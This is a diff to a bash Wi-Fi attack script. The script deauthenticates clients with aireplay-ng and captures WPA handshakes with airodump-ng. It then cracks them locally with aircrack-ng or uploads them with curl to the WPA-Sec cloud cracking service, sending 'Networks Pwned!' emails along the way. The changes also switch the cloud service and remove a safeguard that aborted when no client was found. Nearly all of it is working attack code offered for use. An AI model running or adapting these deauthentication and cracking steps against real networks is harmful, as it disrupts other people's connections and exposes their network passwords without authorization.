@@ -236,7 +236,7 @@ check_cap_files
 sleep 3
 pkill -9 xterm
 echo "Handshakes have been captured!" | mail -s "Networks Pwned!" $email
-crack
+#crack
 }
 
 
@@ -249,7 +249,7 @@ xterm -e aireplay-ng --deauth 20 -a $bssid $foo
 echo -e "[${Green}Status${White}] Checking for Handshake Packet..."
 check_cap_files
 pkill -9 xterm
-crack
+#crack
 }
 
 wordlist () {        ##### Enter path to wordlist or use default #####
@@ -350,63 +350,14 @@ sudo ./Wifite.py
 crack () {
 echo "Handshakes have been captured!" | mail -s "Networks Pwned!" $email > /dev/null 2>&1
 crack_hashes
-cleanup 
 }
 
 
-convert_cap_to_hccapx() {
-    # Check if hcxhash2cap is installed
-    if ! command -v hcxhash2cap &> /dev/null
-    then
-        echo "hcxhash2cap could not be found. Please install it first."
-        exit 1
-    fi
-
-    # Ensure the correct number of arguments is provided
-    if [ $# -ne 1 ]; then
-        echo "Usage: $0 <path-to-cap-file>"
-        exit 1
-    fi
-
-    # Input file (.cap)
-    cap_file="$1"
-
-    # Check if the file exists and is a .cap file
-    if [ ! -f "$cap_file" ]; then
-        echo "File $cap_file not found!"
-        exit 1
-    fi
-
-    if [[ "$cap_file" != *.cap ]]; then
-        echo "Please provide a .cap file!"
-        exit 1
-    fi
-
-    # Output file name (same as input file but with .hccapx extension)
-    hccapx_file="${cap_file%.cap}.hccapx"
-
-    # Convert the .cap file to .hccapx using hcxhash2cap
-    echo "Converting $cap_file to $hccapx_file..."
-    hcxhash2cap --hccapx "$hccapx_file" "$cap_file" || {
-        echo "Error: Conversion failed!"
-        exit 1
-    }
-
-    # Check if the conversion file exists
-    if [ ! -f "$hccapx_file" ]; then
-        echo "Error: $hccapx_file does not exist. Please check the conversion process."
-        exit 1
-    fi
-
-    echo "Conversion successful: $hccapx_file"
-}
 
 
-# Function to crack hashes locally or via cloud
 crack_hashes() {
-    # Ask user for input method
     echo "Do you want to crack hashes on your device or with the cloud?"
-    select method in "Local (Device)" "Cloud (OnlineHashCrack)"; do
+    select method in "Local (Device)" "Cloud (WPA-Sec)"; do
         case $method in
             "Local (Device)")
                 # Local cracking with Hashcat or other methods (you can extend this part)
@@ -416,12 +367,14 @@ crack_hashes() {
                 ls *.txt
                 read -p "Enter path to wordlist : " wordlist
                 $wordlist
-                sudo aircrack-ng -w $wordlist *.cap 
-                break
+                sudo aircrack-ng -w "$wordlist" *.cap
+                cleanup_handshakes
+                cleanup
+                exit
                 ;;
-            "Cloud (OnlineHashCrack)")
-                # Ask for the user's email for cloud cracking
-                echo "Please provide your email for OnlineHashCrack service:"
+            "Cloud (WPA-Sec)")
+                # Ask for the user's email for cloud cracking (optional, based on the site)
+                echo "Please provide your email for WPA-Sec service:"
                 read -p "Email: " user_email
 
                 if [[ -z "$user_email" ]]; then
@@ -429,34 +382,57 @@ crack_hashes() {
                     exit 1
                 fi
 
-                # Convert the cap file to hccapx format
+                # Ask for the path to the .cap file
                 echo "Please provide the path to your .cap file:"
                 echo "Your current directory:"
                 pwd
-                ls *.cap  
+                ls *.cap
                 read -p "Path to .cap file: " cap_file
 
-                # Call the conversion function
-                convert_cap_to_hccapx "$cap_file"
-                hccapx_file="${cap_file%.cap}.hccapx"
-
-                # Check if the .hccapx file exists before attempting upload
-                if [ ! -f "$hccapx_file" ]; then
-                    echo "Error: $hccapx_file does not exist. Please check the conversion process."
+                # Check if the file exists
+                if [[ ! -f "$cap_file" ]]; then
+                    echo "File not found. Exiting."
                     exit 1
                 fi
 
-                # Upload to OnlineHashCrack
-                echo "Uploading $hccapx_file to OnlineHashCrack..."
-                response=$(curl -s -w "%{http_code}" -X POST https://www.onlinehashcrack.com/crack-wpa/ \
+                # Ensure user agrees to terms and conditions (optional, based on the site)
+                echo "Please agree to the Terms & Conditions by typing 'yes':"
+                read agreement
+
+                if [[ "$agreement" != "yes" ]]; then
+                    echo "You must agree to the terms to continue. Exiting."
+                    exit 1
+                fi
+
+                # Read the key from key.txt
+                if [[ ! -f "key.txt" ]]; then
+                    echo "key.txt file not found. Exiting."
+                    exit 1
+                fi
+
+                # Get the key from key.txt
+                key=$(cat key.txt)
+
+                # Check if the key is empty
+                if [[ -z "$key" ]]; then
+                    echo "Key in key.txt is empty. Exiting."
+                    exit 1
+                fi
+
+                # Upload to WPA-Sec
+                echo "Uploading $cap_file to WPA-Sec..."
+                response=$(curl -s -w "%{http_code}" -X POST "https://wpa-sec.stanev.org/?submit" \
                     -F "email=$user_email" \
-                    -F "file=@$hccapx_file" \
-                    -F "hash_type=wpa" \
+                    -F "file=@$cap_file" \
+                    -F "key=$key" \
                     -F "submit=Submit")
 
                 # Output the response status code and body for debugging
-                echo "Response Code: $response"
+                echo "Response: $response" 
+                echo "This capture is legacy but will still work..."
+                echo "Handshakes have been successfully submitted. If a password is found you will receive an email."
 
+                # Check the response to determine if submission was successful
                 if [[ "$response" == *"Cracking started"* ]]; then
                     echo "Cracking request submitted successfully."
                 else
@@ -472,7 +448,6 @@ crack_hashes() {
     done
 }
 
-
 cleanup () {
 #$sudo airmon-ng stop $foo
 #checkDependencies
@@ -483,15 +458,17 @@ sudo rm -f *.netxml > /dev/null 2>&1
 sudo rm -f airodump_output.log > /dev/null 2>&1
 sudo rm -f *.ivs > /dev/null 2>&1
 cleanup_handshakes
-exit
+#exit
 
 }
 
 
 cleanup_handshakes() {
+    cd /home/*/air-script/
   # Check if the handshakes folder exists, if not create it
   if [ ! -d "handshakes" ]; then
     echo "Creating handshakes directory..."
+    cd /home/*/air-script
     mkdir handshakes
   fi
 
@@ -784,6 +761,7 @@ check_cap_files() {
                 echo "Handshakes have been captured!" | mail -s "Networks Pwned!" $email > /dev/null 2>&1
                 # Now proceed with cracking
                 crack "$cap_file"  # Assuming 'crack' is a function that accepts the file
+                
                 return 0  # Stop after finding a valid file with EAPOL
             else
                 echo -e "\e[31m[EAPOL Not Found]\e[0m Skipping file."
@@ -803,20 +781,13 @@ check_cap_files() {
 }
 
 deauthAttack () {
-sudo rm -rf *.cap
 sudo airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake $foo > /dev/null &
 recon
-# Ensure recon is done and client was found before proceeding to the next steps
-if [ "$client_found" = true ]; then
+
     sleep 4
 xterm -e aireplay-ng -0 50 -a $bssid -c $client $foo
 sleep 2
 check_cap_files
-    echo -e "\e[32m[Proceeding with next steps]\e[0m"
-else
-    echo -e "\e[31m[Recon failed to find a client, aborting subsequent steps.]\e[0m"
-    exit 1
-fi
  } 
 
 
@@ -830,7 +801,7 @@ recon() {
         echo -e "\e[32m[Scanning for clients...]\e[0m"  # Green text for scanning message
 
         # Start airodump-ng with sudo for permission
-        xterm -hold -e "sudo airodump-ng --bssid $bssid --channel $channel --output-format csv --write client $foo && sleep 60 && exit" &
+        xterm -hold -e "sudo airodump-ng --bssid $bssid --channel $channel --output-format csv --write client $foo && sleep 60 && exit" > /dev/null 2>&1 &
 
         # Allow 60 seconds for the capture file to populate (increased wait time)
         echo "Waiting for 60 seconds for airodump to capture data..."
@@ -1320,8 +1291,7 @@ done
 
 
 clean () {
-sudo rm -r *cap> /dev/null 2>&1
-sudo rm -r ipscan_3.7.6_all.deb> /dev/null 2>&1
+sudo rm -r ipscan_3.7.6_all.deb > /dev/null 2>&1
 cleanup
 }
 
@@ -1403,7 +1373,7 @@ interrupt_handler() {
     echo "Script interrupted! Cleaning up..."
     stopMon
     # Perform cleanup tasks here
-
+	cleanup
 
 # Set up the trap for SIGINT (Ctrl+C) and SIGTERM (kill command)
 trap interrupt_handler SIGINT SIGTERM
